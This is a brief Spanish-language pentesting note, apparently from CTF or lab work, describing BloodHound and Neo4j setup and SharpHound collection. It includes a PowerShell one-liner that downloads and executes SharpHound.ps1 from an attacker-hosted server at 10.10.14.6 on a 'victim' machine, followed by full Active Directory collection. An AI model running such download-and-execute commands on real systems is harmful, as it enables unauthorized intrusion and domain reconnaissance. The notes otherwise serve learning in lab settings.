# bloodhound

{% stepper %}
{% step %}
### Instalar Neo4j y BloodHound

* Instalamos neo4j y bloodhound.
{% endstep %}

{% step %}
### Iniciar Neo4j

* neo4j console
{% endstep %}

{% step %}
### Acceder a la interfaz de Neo4j

* Accedemos al localhost por el puerto 7474 y si es la primera vez que lo usamos creamos las credenciales nuevas.
{% endstep %}

{% step %}
### Acceder a BloodHound

* Accedemos a BloodHound con las nuevas credenciales que hemos creado con el usuario `bloodhound`.
{% endstep %}

{% step %}
### Preparar SharpHound

* Nos descargamos el `SharpHound.ps1` y lo subimos a la máquina víctima.\
  !\[Pasted image 20240722004159.png]\(Pasted image 20240722004159.png)
{% endstep %}

{% step %}
### Servir SharpHound desde atacante

* En la máquina atacante levantamos un servidor en el puerto 80 (por ejemplo con Python) compartiendo el contenido del `SharpHound.ps1`.
* En la máquina víctima ejecutamos:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/SharpHound.ps1')
```
{% endstep %}

{% step %}
### Ejecutar la recolección con BloodHound

* En la máquina víctima ejecutas:

```powershell
Invoke-BloodHound -CollectionMethod All
```
{% endstep %}
{% endstepper %}
